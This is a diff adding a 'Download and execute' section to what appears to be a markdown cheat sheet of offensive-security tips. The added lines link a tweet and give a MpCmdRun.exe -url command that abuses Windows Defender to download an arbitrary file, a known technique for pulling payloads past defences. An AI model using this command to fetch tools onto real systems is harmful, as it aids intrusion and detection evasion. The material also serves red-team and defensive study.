@@ -22,6 +22,12 @@
 ## Phishing
 [Post exploitation creds](https://medium.com/@shantanukhande/post-exploitation-creds-5a8de8676792)
 
+## Download and execute
+
+* [Download via Defender](https://twitter.com/mohammadaskar2/status/1301263551638761477)
+![Defender download](https://pbs.twimg.com/media/Eg8ESSWWAAACTGo?format=jpg&name=large)
+* (You can use C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\MpCmdRun.exe -url <url> -path <local-path> to download your file using Windows defender itself.)
+
 ## SSH 
 * If you are always looking through your ssh conf files for a specific host entry, this simple bash function might be just what you need. 
 
